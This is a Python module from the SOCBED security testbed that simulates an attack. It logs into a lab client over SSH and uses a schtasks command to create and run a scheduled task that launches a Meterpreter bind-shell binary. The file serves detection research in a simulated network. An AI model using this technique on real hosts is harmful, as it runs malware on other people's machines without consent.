# Copyright 2016-2022 Fraunhofer FKIE
#
# This file is part of SOCBED.
#
# SOCBED is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# SOCBED is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with SOCBED. If not, see <http://www.gnu.org/licenses/>.


import uuid

from attacks import AttackOptions, Attack, AttackInfo


class ExecuteMalwareAttackOptions(AttackOptions):
    file = "Target file on the client"
    rhost = "Target client host or IP address"

    def _set_defaults(self):
        self.file = "C:\\Windows\\meterpreter_bind_tcp.exe"
        self.rhost = "192.168.56.101"


class ExecuteMalwareAttack(Attack):
    info = AttackInfo(
        name="misc_execute_malware",
        description="Executes a malicious binary on target host")
    options_class = ExecuteMalwareAttackOptions

    def run(self):
        self._set_target()
        with self.check_printed("SUCCESS: Attempted to run the scheduled task"):
            self.exec_command_on_target(self._execute_malware_command())

    def _set_target(self):
        self.ssh_client.target.hostname = self.options.rhost
        self.ssh_client.target.username = "ssh"

    def _execute_malware_command(self):
        file = self.options.file
        random_tag = "tag_" + str(uuid.uuid4())[0:5]
        client_nr = self.options.rhost[-2:].lstrip("0")
        client_name = "client" + client_nr

        cmd = (f"schtasks /create /sc once /st 23:59 /tn {random_tag} "
               f"/tr \"{file}\" /ru BREACH\\{client_name} && "
               f"schtasks /run /tn {random_tag}")
        return cmd
